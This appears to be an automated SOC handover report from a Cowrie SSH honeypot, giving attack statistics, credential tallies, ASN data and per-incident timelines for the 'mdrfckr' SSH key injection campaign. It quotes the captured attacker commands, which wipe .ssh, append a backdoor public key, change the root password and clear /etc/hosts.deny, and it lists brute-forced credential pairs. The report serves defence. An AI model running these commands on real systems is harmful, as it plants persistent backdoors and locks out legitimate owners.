# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-29 |
| **Generated At** | 2026-03-29T05:43:18Z |
| **Shift Time** | 05:43 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **106** |
| Confirmed Threats | **93** |
| False Positives Filtered | **13** (12.3%) |
| Unique Attacker IPs | **73** |
| Countries of Origin | **27** |
| High Severity Cases | **10** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **96** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **48** |
| Unique Credential Pairs | **43** |
| Unique Usernames | **30** |
| Unique Passwords | **41** |
| Successful Auth Pairs | **10** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 10 |
| `default` | 3 |
| `support` | 3 |
| `345gs5662d34` | 3 |
| `test` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 3 |
| `3245gs5662d34` | 3 |
| `123abc` | 2 |
| `default` | 2 |
| `444` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 3 |
| `root` | `3245gs5662d34` | 3 |
| `root` | `444` | 2 |
| `mysql` | `123abc` | 1 |
| `test` | `test2021` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `444` | `65.20.251.41` | 2026-03-29T02:56:09 |
| `root` | `444` | `182.225.134.13` | 2026-03-29T02:56:21 |
| `root` | `hans` | `120.28.109.188` | 2026-03-29T04:06:04 |
| `root` | `3245gs5662d34` | `120.28.109.188` | 2026-03-29T04:06:07 |
| `root` | `huzaifah` | `115.151.72.122` | 2026-03-29T04:28:12 |
| `root` | `!@#123zxc` | `118.193.36.205` | 2026-03-29T04:28:46 |
| `root` | `3245gs5662d34` | `118.193.36.205` | 2026-03-29T04:28:49 |
| `root` | `Al12345678` | `101.53.158.202` | 2026-03-29T04:57:57 |
| `root` | `3245gs5662d34` | `101.53.158.202` | 2026-03-29T04:57:59 |
| `root` | `202688` | `14.103.115.54` | 2026-03-29T05:01:18 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:Wjvk76XNLSQh"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.115.54`, `115.151.72.122`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `120.28.109.188`, `118.193.36.205`, `101.53.158.202`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **73** |
| Unique ASNs | **52** |
| High-Risk ASNs | **43** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4766` | Korea Telecom | 6 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 6 | HIGH |
| `AS213412` | ONYPHE SAS | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS10030` | Celcom Axiata Berhad | 2 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (10)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c6805390f8d2

| Field | Detail |
|---|---|
| **Source IP** | `65.20.251[.]41` |
| **First Seen** | 2026-03-29 02:56 |
| **Last Seen** | 2026-03-29 02:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 02:56:08` | `cowrie.session.connect` |
| `2026-03-29 02:56:08` | `cowrie.client.version` |
| `2026-03-29 02:56:08` | `cowrie.client.kex` |
| `2026-03-29 02:56:09` | `cowrie.login.success` |
| `2026-03-29 02:56:09` | `cowrie.direct-tcpip.request` |
| `2026-03-29 02:56:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.251[.]41` to AbuseIPDB if not already reported
- [ ] Block `65.20.251[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60c0f913e612

| Field | Detail |
|---|---|
| **Source IP** | `182.225.134[.]13` |
| **First Seen** | 2026-03-29 02:56 |
| **Last Seen** | 2026-03-29 02:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 02:56:18` | `cowrie.session.connect` |
| `2026-03-29 02:56:19` | `cowrie.client.version` |
| `2026-03-29 02:56:19` | `cowrie.client.kex` |
| `2026-03-29 02:56:21` | `cowrie.login.success` |
| `2026-03-29 02:56:22` | `cowrie.direct-tcpip.request` |
| `2026-03-29 02:56:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.225.134[.]13` to AbuseIPDB if not already reported
- [ ] Block `182.225.134[.]13` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f036cb3254b

| Field | Detail |
|---|---|
| **Source IP** | `120.28.109[.]188` |
| **First Seen** | 2026-03-29 04:06 |
| **Last Seen** | 2026-03-29 04:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 04:06:03` | `cowrie.session.connect` |
| `2026-03-29 04:06:03` | `cowrie.client.version` |
| `2026-03-29 04:06:03` | `cowrie.client.kex` |
| `2026-03-29 04:06:04` | `cowrie.login.success` |
| `2026-03-29 04:06:04` | `cowrie.session.params` |
| `2026-03-29 04:06:04` | `cowrie.command.input` |
| `2026-03-29 04:06:04` | `cowrie.command.failed` |
| `2026-03-29 04:06:04` | `cowrie.log.closed` |
| `2026-03-29 04:06:04` | `cowrie.session.params` |
| `2026-03-29 04:06:05` | `cowrie.command.input` |
| `2026-03-29 04:06:05` | `cowrie.session.file_download` |
| `2026-03-29 04:06:05` | `cowrie.log.closed` |
| `2026-03-29 04:06:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.28.109[.]188` to AbuseIPDB if not already reported
- [ ] Block `120.28.109[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-575b7f76e5be

| Field | Detail |
|---|---|
| **Source IP** | `120.28.109[.]188` |
| **First Seen** | 2026-03-29 04:06 |
| **Last Seen** | 2026-03-29 04:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 04:06:06` | `cowrie.session.connect` |
| `2026-03-29 04:06:06` | `cowrie.client.version` |
| `2026-03-29 04:06:06` | `cowrie.client.kex` |
| `2026-03-29 04:06:07` | `cowrie.login.success` |
| `2026-03-29 04:06:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.28.109[.]188` to AbuseIPDB if not already reported
- [ ] Block `120.28.109[.]188` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d267f8919dc

| Field | Detail |
|---|---|
| **Source IP** | `115.151.72[.]122` |
| **First Seen** | 2026-03-29 04:28 |
| **Last Seen** | 2026-03-29 04:28 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Wjvk76XNLSQh"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 04:28:11` | `cowrie.session.connect` |
| `2026-03-29 04:28:11` | `cowrie.client.version` |
| `2026-03-29 04:28:11` | `cowrie.client.kex` |
| `2026-03-29 04:28:12` | `cowrie.login.success` |
| `2026-03-29 04:28:12` | `cowrie.session.params` |
| `2026-03-29 04:28:12` | `cowrie.command.input` |
| `2026-03-29 04:28:12` | `cowrie.command.failed` |
| `2026-03-29 04:28:13` | `cowrie.log.closed` |
| `2026-03-29 04:28:13` | `cowrie.session.params` |
| `2026-03-29 04:28:13` | `cowrie.command.input` |
| `2026-03-29 04:28:13` | `cowrie.session.file_download` |
| `2026-03-29 04:28:13` | `cowrie.log.closed` |
| `2026-03-29 04:28:29` | `cowrie.session.params` |
| `2026-03-29 04:28:29` | `cowrie.command.input` |
| `2026-03-29 04:28:29` | `cowrie.log.closed` |
| `2026-03-29 04:28:30` | `cowrie.session.params` |
| `2026-03-29 04:28:30` | `cowrie.command.input` |
| `2026-03-29 04:28:30` | `cowrie.log.closed` |
| `2026-03-29 04:28:30` | `cowrie.session.params` |
| `2026-03-29 04:28:30` | `cowrie.command.input` |
| `2026-03-29 04:28:30` | `cowrie.session.file_download` |
| `2026-03-29 04:28:30` | `cowrie.log.closed` |
| `2026-03-29 04:28:31` | `cowrie.session.params` |
| `2026-03-29 04:28:31` | `cowrie.command.input` |
| `2026-03-29 04:28:31` | `cowrie.log.closed` |
| `2026-03-29 04:28:31` | `cowrie.session.params` |
| `2026-03-29 04:28:31` | `cowrie.command.input` |
| `2026-03-29 04:28:31` | `cowrie.log.closed` |
| `2026-03-29 04:28:32` | `cowrie.session.params` |
| `2026-03-29 04:28:32` | `cowrie.command.input` |
| `2026-03-29 04:28:32` | `cowrie.command.input` |
| `2026-03-29 04:28:32` | `cowrie.log.closed` |
| `2026-03-29 04:28:32` | `cowrie.session.params` |
| `2026-03-29 04:28:32` | `cowrie.command.input` |
| `2026-03-29 04:28:32` | `cowrie.log.closed` |
| `2026-03-29 04:28:32` | `cowrie.session.params` |
| `2026-03-29 04:28:32` | `cowrie.command.input` |
| `2026-03-29 04:28:33` | `cowrie.log.closed` |
| `2026-03-29 04:28:33` | `cowrie.session.params` |
| `2026-03-29 04:28:33` | `cowrie.command.input` |
| `2026-03-29 04:28:33` | `cowrie.log.closed` |
| `2026-03-29 04:28:33` | `cowrie.session.params` |
| `2026-03-29 04:28:33` | `cowrie.command.input` |
| `2026-03-29 04:28:34` | `cowrie.log.closed` |
| `2026-03-29 04:28:34` | `cowrie.session.params` |
| `2026-03-29 04:28:34` | `cowrie.command.input` |
| `2026-03-29 04:28:34` | `cowrie.log.closed` |
| `2026-03-29 04:28:34` | `cowrie.session.params` |
| `2026-03-29 04:28:34` | `cowrie.command.input` |
| `2026-03-29 04:28:35` | `cowrie.log.closed` |
| `2026-03-29 04:28:35` | `cowrie.session.params` |
| `2026-03-29 04:28:35` | `cowrie.command.input` |
| `2026-03-29 04:28:35` | `cowrie.log.closed` |
| `2026-03-29 04:28:35` | `cowrie.session.params` |
| `2026-03-29 04:28:35` | `cowrie.command.input` |
| `2026-03-29 04:28:35` | `cowrie.log.closed` |
| `2026-03-29 04:28:36` | `cowrie.session.params` |
| `2026-03-29 04:28:36` | `cowrie.command.input` |
| `2026-03-29 04:28:36` | `cowrie.log.closed` |
| `2026-03-29 04:28:36` | `cowrie.session.params` |
| `2026-03-29 04:28:36` | `cowrie.command.input` |
| `2026-03-29 04:28:36` | `cowrie.log.closed` |
| `2026-03-29 04:28:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.151.72[.]122` to AbuseIPDB if not already reported
- [ ] Block `115.151.72[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-549eaa126ef4

| Field | Detail |
|---|---|
| **Source IP** | `118.193.36[.]205` |
| **First Seen** | 2026-03-29 04:28 |
| **Last Seen** | 2026-03-29 04:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 04:28:45` | `cowrie.session.connect` |
| `2026-03-29 04:28:45` | `cowrie.client.version` |
| `2026-03-29 04:28:45` | `cowrie.client.kex` |
| `2026-03-29 04:28:46` | `cowrie.login.success` |
| `2026-03-29 04:28:46` | `cowrie.session.params` |
| `2026-03-29 04:28:46` | `cowrie.command.input` |
| `2026-03-29 04:28:46` | `cowrie.command.failed` |
| `2026-03-29 04:28:46` | `cowrie.log.closed` |
| `2026-03-29 04:28:46` | `cowrie.session.params` |
| `2026-03-29 04:28:46` | `cowrie.command.input` |
| `2026-03-29 04:28:46` | `cowrie.session.file_download` |
| `2026-03-29 04:28:46` | `cowrie.log.closed` |
| `2026-03-29 04:28:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.36[.]205` to AbuseIPDB if not already reported
- [ ] Block `118.193.36[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e66f9726fdef

| Field | Detail |
|---|---|
| **Source IP** | `118.193.36[.]205` |
| **First Seen** | 2026-03-29 04:28 |
| **Last Seen** | 2026-03-29 04:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 04:28:48` | `cowrie.session.connect` |
| `2026-03-29 04:28:48` | `cowrie.client.version` |
| `2026-03-29 04:28:48` | `cowrie.client.kex` |
| `2026-03-29 04:28:49` | `cowrie.login.success` |
| `2026-03-29 04:28:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.36[.]205` to AbuseIPDB if not already reported
- [ ] Block `118.193.36[.]205` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1dc6804522d

| Field | Detail |
|---|---|
| **Source IP** | `101.53.158[.]202` |
| **First Seen** | 2026-03-29 04:57 |
| **Last Seen** | 2026-03-29 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 04:57:57` | `cowrie.session.connect` |
| `2026-03-29 04:57:57` | `cowrie.client.version` |
| `2026-03-29 04:57:57` | `cowrie.client.kex` |
| `2026-03-29 04:57:57` | `cowrie.login.success` |
| `2026-03-29 04:57:57` | `cowrie.session.params` |
| `2026-03-29 04:57:57` | `cowrie.command.input` |
| `2026-03-29 04:57:57` | `cowrie.command.failed` |
| `2026-03-29 04:57:57` | `cowrie.log.closed` |
| `2026-03-29 04:57:57` | `cowrie.session.params` |
| `2026-03-29 04:57:57` | `cowrie.command.input` |
| `2026-03-29 04:57:57` | `cowrie.session.file_download` |
| `2026-03-29 04:57:57` | `cowrie.log.closed` |
| `2026-03-29 04:57:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.53.158[.]202` to AbuseIPDB if not already reported
- [ ] Block `101.53.158[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2125337a1947

| Field | Detail |
|---|---|
| **Source IP** | `101.53.158[.]202` |
| **First Seen** | 2026-03-29 04:57 |
| **Last Seen** | 2026-03-29 04:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 04:57:58` | `cowrie.session.connect` |
| `2026-03-29 04:57:58` | `cowrie.client.version` |
| `2026-03-29 04:57:58` | `cowrie.client.kex` |
| `2026-03-29 04:57:59` | `cowrie.login.success` |
| `2026-03-29 04:57:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.53.158[.]202` to AbuseIPDB if not already reported
- [ ] Block `101.53.158[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c73cd626747d

| Field | Detail |
|---|---|
| **Source IP** | `14.103.115[.]54` |
| **First Seen** | 2026-03-29 05:01 |
| **Last Seen** | 2026-03-29 05:01 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:CvUKpKYlXuPr"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-29 05:01:17` | `cowrie.session.connect` |
| `2026-03-29 05:01:17` | `cowrie.client.version` |
| `2026-03-29 05:01:17` | `cowrie.client.kex` |
| `2026-03-29 05:01:18` | `cowrie.login.success` |
| `2026-03-29 05:01:18` | `cowrie.session.params` |
| `2026-03-29 05:01:18` | `cowrie.command.input` |
| `2026-03-29 05:01:18` | `cowrie.command.failed` |
| `2026-03-29 05:01:18` | `cowrie.log.closed` |
| `2026-03-29 05:01:19` | `cowrie.session.params` |
| `2026-03-29 05:01:19` | `cowrie.command.input` |
| `2026-03-29 05:01:19` | `cowrie.session.file_download` |
| `2026-03-29 05:01:19` | `cowrie.log.closed` |
| `2026-03-29 05:01:36` | `cowrie.session.params` |
| `2026-03-29 05:01:36` | `cowrie.command.input` |
| `2026-03-29 05:01:36` | `cowrie.log.closed` |
| `2026-03-29 05:01:36` | `cowrie.session.params` |
| `2026-03-29 05:01:36` | `cowrie.command.input` |
| `2026-03-29 05:01:36` | `cowrie.log.closed` |
| `2026-03-29 05:01:37` | `cowrie.session.params` |
| `2026-03-29 05:01:37` | `cowrie.command.input` |
| `2026-03-29 05:01:37` | `cowrie.session.file_download` |
| `2026-03-29 05:01:37` | `cowrie.log.closed` |
| `2026-03-29 05:01:37` | `cowrie.session.params` |
| `2026-03-29 05:01:37` | `cowrie.command.input` |
| `2026-03-29 05:01:38` | `cowrie.log.closed` |
| `2026-03-29 05:01:38` | `cowrie.session.params` |
| `2026-03-29 05:01:38` | `cowrie.command.input` |
| `2026-03-29 05:01:38` | `cowrie.log.closed` |
| `2026-03-29 05:01:38` | `cowrie.session.params` |
| `2026-03-29 05:01:38` | `cowrie.command.input` |
| `2026-03-29 05:01:38` | `cowrie.command.input` |
| `2026-03-29 05:01:38` | `cowrie.log.closed` |
| `2026-03-29 05:01:39` | `cowrie.session.params` |
| `2026-03-29 05:01:39` | `cowrie.command.input` |
| `2026-03-29 05:01:39` | `cowrie.log.closed` |
| `2026-03-29 05:01:40` | `cowrie.session.params` |
| `2026-03-29 05:01:40` | `cowrie.command.input` |
| `2026-03-29 05:01:40` | `cowrie.log.closed` |
| `2026-03-29 05:01:40` | `cowrie.session.params` |
| `2026-03-29 05:01:40` | `cowrie.command.input` |
| `2026-03-29 05:01:40` | `cowrie.log.closed` |
| `2026-03-29 05:01:41` | `cowrie.session.params` |
| `2026-03-29 05:01:41` | `cowrie.command.input` |
| `2026-03-29 05:01:41` | `cowrie.log.closed` |
| `2026-03-29 05:01:41` | `cowrie.session.params` |
